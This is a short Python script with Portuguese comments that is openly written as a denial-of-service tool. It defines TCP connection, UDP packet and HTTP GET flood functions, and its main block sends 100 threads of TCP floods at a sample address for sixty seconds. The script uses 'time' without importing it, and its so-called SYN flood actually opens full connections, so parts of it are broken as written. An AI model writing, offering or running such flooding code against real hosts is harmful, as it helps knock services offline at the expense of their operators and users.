import socket
import threading
import random

def tcp_syn_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((target_ip, target_port))
        except:
            pass
        finally:
            s.close()

def udp_flood(target_ip, target_port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = b"A" * 1024  # Pacote de 1KB
        try:
            s.sendto(data, (target_ip, target_port))
        except:
            pass
        finally:
            s.close()

def http_get_flood(target_url, duration):
    import requests
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            requests.get(target_url)
        except:
            pass

# Exemplo de uso
if __name__ == "__main__":
    target_ip = "192.168.1.1"
    target_port = 80
    duration = 60  # Segundos
    
    # Iniciar múltiplas threads para o ataque
    threads = []
    for _ in range(100):  # 100 threads simultâneas
        t = threading.Thread(target=tcp_syn_flood, args=(target_ip, target_port, duration))
        threads.append(t)
        t.start()
    
    for t in threads:
        t.join()
